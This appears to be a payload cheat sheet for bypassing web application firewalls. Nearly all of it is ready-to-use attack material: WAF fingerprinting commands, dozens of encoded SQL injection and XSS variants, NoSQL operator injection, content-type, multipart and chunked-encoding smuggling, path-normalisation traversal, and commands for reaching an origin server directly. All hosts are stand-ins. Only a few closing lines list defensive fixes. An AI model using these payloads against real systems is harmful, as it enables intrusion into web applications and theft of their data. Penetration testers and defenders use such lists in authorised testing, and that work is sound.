files.content: # WAF and Filter Bypass Payloads # Transformation fragments and fixtures. Start with a blocked probe and change one property at a time. # Fingerprinting (commands and indicators) wafw00f https://app.example.test nmap --script http-waf-detect,http-waf-fingerprint -p 443 app.example.test curl -sI "https://app.example.test/?q=" curl -sI "https://app.example.test/?q=' OR 1=1--" curl -sI "https://app.example.test/../../etc/passwd" Server: cloudflare Server: AkamaiGHost Server: awselb/2.0 Server: BigIP X-Sucuri-ID: X-CDN: Imperva X-Iinfo: X-Amz-Cf-Id: CF-RAY: x-azure-ref: Set-Cookie: visid_incap_ Set-Cookie: __cf_bm Set-Cookie: AWSALB Set-Cookie: BIGipServer Set-Cookie: citrix_ns_id Set-Cookie: ak_bmsc # URL encoding variants of a blocked character sequence (example payload: ' OR 1=1--) %27%20OR%201%3D1-- %2527%2520OR%25201%253D1-- %252527%252520OR%2525201%25253D1-- %u0027%u0020OR%u00201%u003D1-- %C0%A7%20OR%201=1-- %EF%BC%87%20OR%201=1-- %ef%bc%87 OR 1=1-- # Case, comment and whitespace variants ' oR 1=1-- ' OR/*x*/1=1-- ' OR-- x 1=1-- ' OR 1=1# ' OR 1 LIKE 1-- ' OR 2>1-- ' AND 1=1 UNION SELECT NULL-- # HTML and JavaScript encoding variants for XSS filters click x # JSON body variants (the WAF may not decode JSON escapes while the application does) {"q":"\u0027 OR 1=1--"} {"q":"\u003cscript\u003ealert(1)\u003c/script\u003e"} {"q":"\u003Cimg src=x onerror=alert(1)\u003E"} {"q":["' OR 1=1--"]} {"q":{"$ne":""}} {"a":"1","q":"' OR 1=1--"} {"q":"' OR 1=1--","q":"safe"} {"q":"safe","q":"' OR 1=1--"} {"\u0071":"' OR 1=1--"} # Content-type and body-format switching Content-Type: application/json -> Content-Type: application/x-www-form-urlencoded Content-Type: application/x-www-form-urlencoded -> Content-Type: application/json Content-Type: application/x-www-form-urlencoded -> Content-Type: multipart/form-data; boundary=x Content-Type: text/xml Content-Type: application/x-www-form-urlencoded; charset=ibm500 Content-Type: application/x-www-form-urlencoded; charset=utf-7 Content-Type: application/json; charset=utf-16 Content-Type: multipart/form-data; boundary=x; charset=utf-7 Content-Type: multipart/form-data; boundary="x" Content-Type: multipart/form-data; boundary=x;boundary=y Content-Type: multipart/form-data;boundary=x Content-Type : multipart/form-data; boundary=x # Multipart body variants --x\r\nContent-Disposition: form-data; name="q"\r\n\r\n' OR 1=1--\r\n--x-- --x\r\nContent-Disposition: form-data; name="q"; filename="a.txt"\r\n\r\n' OR 1=1--\r\n--x-- --x\r\nContent-Disposition: form-data; name=q\r\n\r\n' OR 1=1--\r\n--x-- --x\r\nContent-Disposition: form-data;name="q"\r\n\r\n' OR 1=1--\r\n--x-- --x\r\ncontent-disposition: form-data; name="q"\r\n\r\n' OR 1=1--\r\n--x-- --x\r\nContent-Disposition: form-data; name="q\"\r\n\r\n' OR 1=1--\r\n--x-- --x\r\nContent-Disposition: form-data; name="q"\r\nContent-Type: text/plain\r\n\r\n' OR 1=1--\r\n--x-- --x\nContent-Disposition: form-data; name="q"\n\n' OR 1=1--\n--x-- # Chunked transfer-encoding (split a blocked token across chunks; the sizes are hexadecimal) Transfer-Encoding: chunked with body 3\r\n' O\r\n9\r\nR 1=1-- \r\n0\r\n\r\n Transfer-Encoding: chunked with body 1\r\n'\r\n1\r\n \r\n2\r\nOR\r\n0\r\n\r\n Transfer-Encoding: chunked with chunk extensions 4;x=y\r\n' OR\r\n0\r\n\r\n Transfer-Encoding:\tchunked # Content-Encoding (a WAF may not decompress) Content-Encoding: gzip with a gzip-compressed form body Content-Encoding: deflate with a deflate-compressed form body Content-Encoding: br with a brotli-compressed form body # Oversized or padded bodies (some products inspect only the first N bytes) python3 -c "print('a=' + 'x'*8192 + '&q=\' OR 1=1--')" python3 -c "print('a=' + 'x'*16384 + '&q=')" python3 -c "print('{\"pad\":\"' + 'x'*32768 + '\",\"q\":\"\\' OR 1=1--\"}')" python3 -c "print('')" # Parameter handling (see HTTP-Parameter-Pollution for the full list) ?q=1&q=' OR 1=1-- ?q=' OR&q=1=1-- ?q[]=' OR 1=1-- ?Q=' OR 1=1-- ?q=safe&&q=' OR 1=1-- ?q=safe;q=' OR 1=1-- ?q=%27%20OR%201=1--&q=safe # Header, cookie and path positions (some rule sets cover only the query and body) User-Agent: ' OR 1=1-- Referer: https://app.example.test/?q=' OR 1=1-- Cookie: q=' OR 1=1-- X-Forwarded-For: ' OR 1=1-- X-Api-Version: ' OR 1=1-- /search/' OR 1=1-- /search;x=' OR 1=1-- /search/..;/' OR 1=1-- /search%2f%27%20OR%201=1-- # Path-normalisation variants (WAF and application normalise differently) //admin /./admin /admin/. /admin;x /admin;.css /%2e%2e/admin /..;/admin /admin%2f /admin%2f%2e%2e%2f /admin%20 /admin%09 /admin..%2f /static/..%2fadmin /static/%2e%2e/admin # HTTP method and protocol variants GET /?q=' OR 1=1-- HEAD /?q=' OR 1=1-- OPTIONS /?q=' OR 1=1-- POST /?q=' OR 1=1-- PUT /?q=' OR 1=1-- PATCH /?q=' OR 1=1-- DELETE /?q=' OR 1=1-- FOO /?q=' OR 1=1-- GET /?q=' OR 1=1-- HTTP/1.0 # Origin access that skips the WAF (own infrastructure) curl -sk --resolve app.example.test:443:203.0.113.10 https://app.example.test/ curl -sk -H "Host: app.example.test" https://203.0.113.10/ curl -s http://203.0.113.10:8080/ dig +short TXT example.test dig +short A origin.example.test dig +short A direct.example.test dig +short A mail.example.test dig +short A cpanel.example.test dig +short A dev.example.test dig +short A staging.example.test shodan search ssl.cert.subject.cn:app.example.test # Rate-based and behavioural rule checks # Send the blocked payload at a low request rate and a high rate # Rotate User-Agent, Accept-Language and header order # Send the request over a fresh connection each time and over a reused connection # Send the payload on the first request and on the 10th request of a session # Send from an IP in a region that is allow-listed or less strictly filtered # Fixes to recommend instead of relying on the WAF # Validate and encode in the application (parameterised queries, contextual output encoding) # Apply a virtual patch for the specific vulnerability class # Normalise and decode once, before inspection and before use # Block unknown content types and oversized bodies explicitly # Restrict direct access to the origin to the WAF's address ranges
